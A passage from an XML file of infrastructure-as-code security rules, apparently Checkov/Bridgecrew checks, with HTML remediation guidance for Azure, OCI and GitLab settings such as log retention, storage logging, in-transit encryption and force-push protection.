<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resources</strong>:<br/>
azurerm_storage_account<br/>
azurerm_storage_account_network_rules</li>
<li><strong>Argument</strong>: bypass</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_storage_account" "example" {
    ...
+   bypass                     = ["AzureServices"]
    }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/enable-trusted-microsoft-services-for-storage-account-access' target='_blank'> https://docs.bridgecrew.io/docs/enable-trusted-microsoft-services-for-storage-account-access</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/enable-trusted-microsoft-services-for-storage-account-access' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_12</key>
    <name>Ensure Azure Network Watcher NSG flow logs retention is greater than 90 days</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-network-watcher-nsg-flow-logs-retention-is-less-than-90-days"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-network-watcher-nsg-flow-logs-retention-is-less-than-90-days"></div>Azure Network Watcher NSG flow logs retention is less than 90 days</div><a aria-label="Skip link to Azure Network Watcher NSG flow logs retention is less than 90 days" class="heading-anchor-icon fa fa-anchor" href="#azure-network-watcher-nsg-flow-logs-retention-is-less-than-90-days"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Flow logs enable capturing information about IP traffic flowing in and out of network security groups. Logs can be used to check for anomalies and give insight into suspected breaches.</p>
<p>We recommend your Network Security Group (NSG) Flow Log <strong>Retention Period</strong> is set to greater than or equal to 90 days.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-portal"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-portal"></div>Azure Portal</div><a aria-label="Skip link to Azure Portal" class="heading-anchor-icon fa fa-anchor" href="#azure-portal"></a></h2>
<p>To change the policy using the Azure Portal, follow these steps:</p>
<ol>
<li>Log in to the Azure Portal at <a href="https://portal.azure.com" target="_self">https://portal.azure.com</a>.</li>
<li>Navigate to <strong>Network Watcher</strong> &gt;  <strong>Logs</strong> section.</li>
<li>Select the <strong>NSG flow logs</strong> blade. </li>
<li>For each Network Security Group in the list:<br/>
a) Set <strong>Status</strong> to <strong>On</strong>.<br/>
b) Set <strong>Retention (days)</strong> to <strong>greater than 90 days</strong>.<br/>
c) In <strong>Storage account</strong> select your <em>storage account</em>.<br/>
d) Click <strong>Save</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To enable the <strong>NSG flow logs </strong>and set the <strong>Retention (days)</strong>  to <strong>greater than or equal to 90 days</strong>, use the following command:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">az network watcher flow-log configure 
--nsg &lt;NameorID of the Network Security Group&gt; 
--enabled true 
--resource-group &lt;resourceGroupName&gt; 
--retention 91 
--storage-account &lt;NameorID of the storage account to save flow logs&gt;
</code></pre>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: azurerm_network_watcher_flow_log</li>
<li><strong>Argument</strong>: days</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_network_watcher_flow_log" "test" {
    ...
+   retention_policy {
+   enabled = true
+   days    = &lt;90 or greater&gt;
    }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_azr_logging_1' target='_blank'> https://docs.bridgecrew.io/docs/bc_azr_logging_1</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_azr_logging_1' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_OCI_4</key>
    <name>Ensure OCI Compute Instance boot volume has in-transit data encryption enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="oci-compute-instance-boot-volume-has-in-transit-data-encryption-is-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-oci-compute-instance-boot-volume-has-in-transit-data-encryption-is-disabled"></div>OCI Compute Instance boot volume has in-transit data encryption is disabled</div><a aria-label="Skip link to OCI Compute Instance boot volume has in-transit data encryption is disabled" class="heading-anchor-icon fa fa-anchor" href="#oci-compute-instance-boot-volume-has-in-transit-data-encryption-is-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This policy identifies the OCI Compute Instances that are configured with disabled in-transit data encryption boot or block volumes. It is recommended that Compute Instance boot or block volumes should be configured with in-transit data encryption to minimize risk for sensitive data being leaked.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="oci-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-oci-console"></div>OCI Console</div><a aria-label="Skip link to OCI Console" class="heading-anchor-icon fa fa-anchor" href="#oci-console"></a></h2>
<ol>
<li>Login to the OCI Console</li>
<li>Type the resource reported in the alert into the Search box at the top of the Console.</li>
<li>Click the resource reported in the alert from the Resources submenu</li>
<li>Click Edit</li>
<li>Click on Show Advanced Options</li>
<li>Select USE IN-TRANSIT ENCRYPTION</li>
<li>Click Save Changes<br/>
Note : To update the instance properties, the instance must be rebooted.</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: oci_core_instance</li>
<li><strong>Arguments</strong>: is_pv_encryption_in_transit_enabled</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "oci_core_instance" "pass" {
...
 
  }
  ipxe_script                         = var.instance_ipxe_script
  is_pv_encryption_in_transit_enabled = var.instance_is_pv_encryption_in_transit_enabled

  launch_options {
    boot_volume_type                    = var.instance_launch_options_boot_volume_type
    firmware                            = var.instance_launch_options_firmware
    is_consistent_volume_naming_enabled = var.instance_launch_options_is_consistent_volume_naming_enabled
    is_pv_encryption_in_transit_enabled = true
    network_type                        = var.instance_launch_options_network_type
    remote_data_volume_type             = var.instance_launch_options_remote_data_volume_type
  }
...
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-oci-compute-instance-boot-volume-has-in-transit-data-encryption-enabled' target='_blank'> https://docs.bridgecrew.io/docs/ensure-oci-compute-instance-boot-volume-has-in-transit-data-encryption-enabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-oci-compute-instance-boot-volume-has-in-transit-data-encryption-enabled' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GITLAB_1</key>
    <name>Ensure Gitlab branch protection rules do not allow force pushes</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gitlab-branch-protection-rules-force-push-is-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gitlab-branch-protection-rules-force-push-is-enabled"></div>Gitlab branch protection rules force push is enabled</div><a aria-label="Skip link to Gitlab branch protection rules force push is enabled" class="heading-anchor-icon fa fa-anchor" href="#gitlab-branch-protection-rules-force-push-is-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>In GitLab, permissions are fundamentally defined around the idea of having read or write permission to the repository and branches. To impose further restrictions on certain branches, they can be protected.</p>
<p>When you perform more complex operations, for example, squash commits, reset or rebase your branch, you must force an update to the remote branch. These operations imply rewriting the commit history of the branch. Forcing an update is not recommended when you&#8217;re working on shared branches.</p>
<p>You can enable force push on a protected branch, but this is ill-advised.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li>Resource: gitlab_branch_protection</li>
<li>Attribute: allow_force_push</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "gitlab_branch_protection" "BranchProtect" {
...
-  allow_force_push             = true
+  allow_force_push             = false
...
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-gitlab-branch-protection-rules-does-not-allow-force-pushes' target='_blank'> https://docs.bridgecrew.io/docs/ensure-gitlab-branch-protection-rules-does-not-allow-force-pushes</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-gitlab-branch-protection-rules-does-not-allow-force-pushes' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_33</key>
    <name>Ensure storage logging for queue service has read, write, and delete requests enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="storage-logging-for-queue-service-does-not-have-read-write-and-delete-requests-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-storage-logging-for-queue-service-does-not-have-read-write-and-delete-requests-enabled"></div>Storage logging for queue service does not have read, write, and delete requests enabled</div><a aria-label="Skip link to Storage logging for queue service does not have read, write, and delete requests enabled" class="heading-anchor-icon fa fa-anchor" href="#storage-logging-for-queue-service-does-not-have-read-write-and-delete-requests-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The <strong>Azure Queue Storage</strong> service stores messages that may be read by any client with access to the storage account. A queue may contain an unlimited number of messages, each of which can be up to 64KB in size when using version 2011-08-18 or newer. </p>
<p><strong>Storage Logging</strong> takes place server-side recording details in the storage account for both successful and failed requests. These logs allow users to see the details of read, write, and delete operations against the queues. <strong>Storage Logging</strong> log entries contain the following information about individual requests: timing information, for example start time, end-to-end latency, server latency, authentication details, concurrency information, and the size of request and response messages.</p>
<p><strong>Storage Analytics</strong> logs contain detailed information about successful and failed requests to a storage service. This information can be used to monitor individual requests and to diagnose issues with a storage service. Requests are logged on a best-effort basis. <strong>Storage Analytics</strong> logging is not enabled by default for your storage account.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-portal"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-portal"></div>Azure Portal</div><a aria-label="Skip link to Azure Portal" class="heading-anchor-icon fa fa-anchor" href="#azure-portal"></a></h2>
<p>To change the policy using the Azure Portal, follow these steps:</p>
<ol>
<li>Log in to the Azure Portal at <a href="https://portal.azure.com" target="_self">https://portal.azure.com</a>.</li>
<li>Navigate to <strong>Storage Accounts</strong>.</li>
<li>Select the specific <strong>Storage Account</strong>.</li>
<li>From the <strong>Monitoring</strong> (classic) section, select the <strong>Diagnostics logs</strong> (classic) blade.</li>
<li>Set the <strong>Status</strong> to <strong>On</strong>.</li>
<li>Select <strong>Queue properties</strong>.</li>
<li>Navigate to the <strong>Logging</strong> section to enable <strong>Storage Logging for Queue service</strong>.</li>
<li>Select <strong>Read</strong>, <strong>Write</strong> and <strong>Delete</strong> options.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To enable the <strong>Storage Logging for Queue service</strong>, use the following command:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-az theme-light" data-lang="az" name="">--account-name &lt;storageAccountName&gt; 
--account-key &lt;storageAccountKey&gt; 
--services q 
--log rwd 
--retention 90
</code></pre>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: azurerm_storage_account</li>
<li><strong>Argument</strong>: logging + hour_metrics + minute_metrics</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_storage_account" "example" {
    name                     = "example"
    resource_group_name      = data.azurerm_resource_group.example.name
    location                 = data.azurerm_resource_group.example.location
    account_tier             = "Standard"
    account_replication_type = "GRS"
    queue_properties  {
+   logging {
        delete                = true
        read                  = true
        write                 = true
        version               = "1.0"
        retention_policy_days = 10
    }
  }
}
</code></pre></div></div>
<p>The <strong>logging</strong> field should be enough to enable logging. As Terraform apply might fail, it is recommended to also configure the <strong>hour_metrics</strong> and <strong>minute_metrics</strong> fields.<br/>
To do this, insert the following code in the <strong>queue_properties</strong> section of the code above.</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">+   hour_metrics {
        enabled               = true
        include_apis          = true
        version               = "1.0"
        retention_policy_days = 10
    }
+   minute_metrics {
        enabled               = true
        include_apis          = true
        version               = "1.0"
        retention_policy_days = 10
    }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/enable-requests-on-storage-logging-for-queue-service' target='_blank'> https://docs.bridgecrew.io/docs/enable-requests-on-storage-logging-for-queue-service</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/enable-requests-on-storage-logging-for-queue-service' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_37</key>
    <name>Ensure activity log retention is set to 365 days or greater</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="activity-log-retention-is-set-to-less-than-365-days"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-activity-log-retention-is-set-to-less-than-365-days"></div>Activity log retention is set to less than 365 days </div><a aria-label="Skip link to Activity log retention is set to less than 365 days " class="heading-anchor-icon fa fa-anchor" href="#activity-log-retention-is-set-to-less-than-365-days"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>A log profile controls how the activity log is exported and retained. Since the average time to detect a breach is 210 days, the activity log should be retained for 365 days or more, providing time to respond to any incidents.</p>
<p>We recommend you set activity log retention for 365 days or greater.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-portal"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-portal"></div>Azure Portal</div><a aria-label="Skip link to Azure Portal" class="heading-anchor-icon fa fa-anchor" href="#azure-portal"></a></h2>
<p>To change the policy using the Azure Portal, follow these steps:</p>
<ol>
<li>Log in to the Azure Portal at <a href="https://portal.azure.com" target="_self">https://portal.azure.com</a>.</li>
<li>Navigate to the <strong>Activity log</strong>.</li>
<li>Select <strong>Export</strong>.</li>
<li>Set <strong>Retention (days)</strong> to <strong>365</strong> or <strong>0</strong>.</li>
<li>Click <strong>Save</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To set Activity log Retention (days) to <strong>365 or greater</strong>, use the following command:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">az monitor log-profiles update 
--name &lt;logProfileName&gt; 
--set retentionPolicy.days=&lt;number of days&gt; retentionPolicy.enabled=true
</code></pre>
<p>To store logs for fo<br/>
##Terrarever (indefinitely), use the following command:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">az monitor log-profiles update 
--name &lt;logProfileName&gt; 
--set retentionPolicy.days=0 retentionPolicy.enabled=false
</code></pre>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: azurerm_monitor_log_profile</li>
<li><strong>Argument</strong>: retention policy</li>
</ul>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="option-1"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-option-1"></div>Option 1</div><a aria-label="Skip link to Option 1" class="heading-anchor-icon fa fa-anchor" href="#option-1"></a></h2>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_monitor_log_profile" "example" {
    name = "default"
    categories = [
    "Action",
    "Delete",
    "Write",
    ]
    locations = [
    "westus",
    "global",
    ]
+    retention_policy {
+    enabled = true
+    days    = 365
    }
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="option-2"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-option-2"></div>Option 2</div><a aria-label="Skip link to Option 2" class="heading-anchor-icon fa fa-anchor" href="#option-2"></a></h2>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_monitor_log_profile" "example" {
    name = "default"
    categories = [
    "Action",
    "Delete",
    "Write",
    ]
    locations = [
    "westus",
    "global",
    ]
+    retention_policy {
+    enabled = false
+    days    = 0
    }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/set-activity-log-retention-to-365-days-or-greater' target='_blank'> https://docs.bridgecrew.io/docs/set-activity-log-retention-to-365-days-or-greater</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/set-activity-log-retention-to-365-days-or-greater' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_38</key>
    <name>Ensure log profile is configured to capture all activities</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="log-profile-is-not-configured-to-capture-all-activities"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-log-profile-is-not-configured-to-capture-all-activities"></div>Log profile is not configured to capture all activities</div><a aria-label="Skip link to Log profile is not configured to capture all activities" class="heading-anchor-icon fa fa-anchor" href="#log-profile-is-not-configured-to-capture-all-activities"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>A log profile controls how the activity log is exported. Configuring the log profile to collect logs for the categories <strong>Write</strong>, <strong>Delete</strong> and <strong>Action</strong> ensures that all control/management plane activities performed on the subscription are exported.</p>
<p>We recommend you configure the log profile to export all activities from the control/management plane.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-portal"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-portal"></div>Azure Portal</div><a aria-label="Skip link to Azure Portal" class="heading-anchor-icon fa fa-anchor" href="#azure-portal"></a></h2>
<p>The Azure portal currently has no provision to check or set categories.</p>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To update an existing default log profile, use the following command:<br/>
<button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">az monitor log-profiles update --name default</code></p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: azurerm_monitor_log_profile</li>
<li><strong>Argument</strong>: categories</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_monitor_log_profile" "example" {
    ...
    categories = [
 +   "Action",
 +   "Delete",
 +   "Write",
    ]
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-audit-profile-captures-all-activities' target='_blank'> https://docs.bridgecrew.io/docs/ensure-audit-profile-captures-all-activities</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-audit-profile-captures-all-activities' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_2</key>
    <name>Ensure Azure VM data disk is encrypted with ADE/CMK</name>
    <description>
